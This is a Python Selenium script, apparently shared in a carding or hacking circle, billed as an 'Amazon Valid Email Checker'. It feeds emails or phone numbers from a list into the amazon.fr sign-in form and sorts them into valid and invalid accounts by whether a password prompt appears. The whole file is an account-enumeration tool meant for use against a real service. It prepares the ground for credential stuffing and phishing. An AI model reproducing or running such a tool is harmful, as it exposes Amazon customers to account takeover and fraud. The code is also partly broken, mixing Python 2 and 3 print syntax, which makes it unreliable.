from time import sleep
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.ui import WebDriverWait
import socket
import random
import sys
import os
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from operator import truediv
def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])
   

print("_"*50)
print"        [+] Amazon Valid Email Checker 2022 [+] "
print"        Coded by : rootinabox"
print"        Contact me at :"
print"        Channel : https://t.me/Rootinabox_Channel"
print"        Telegram : @rootinabox"
print("_"*50)
print" "
print"Usage ---> python amazon_checker.py list.txt"
print""


old_number=[]

chrome_options = webdriver.ChromeOptions();
chrome_options.add_argument("--log-level=3")
chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(executable_path="chromedriver.exe", chrome_options=chrome_options)
for phone in open(sys.argv[1],'r').readlines():
 try:
  phone=phone.strip().replace(' ','').replace('\n','')
  if phone in old_number:
    print(phone+" old checked")
    continue
  driver.get("https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
  sleep(1)
  try:
    inpt=driver.find_element(By.XPATH,'//*[@id="ap_email"]')
    submit=driver.find_element(By.XPATH,'//*[@id="continue"]')
    inpt.send_keys(phone)
    submit.submit()
    sleep(1)
    try:
      password=driver.find_element(By.XPATH,'//*[@id="ap_password"]')
      print("\033[32;1mLIVE\033[0m | "+phone+" | [Amazon Email  ]")
      open('checked.txt','a').write(phone+"\n")
    except:
      print("\033[31;1mDIE\033[0m | "+phone+" | [ Amazon Email  ]")
      open('not_work.txt','a').write(phone+"\n")
  except Exception as e:
     print(phone+" error")
 except Exception as e:
   print(e)
   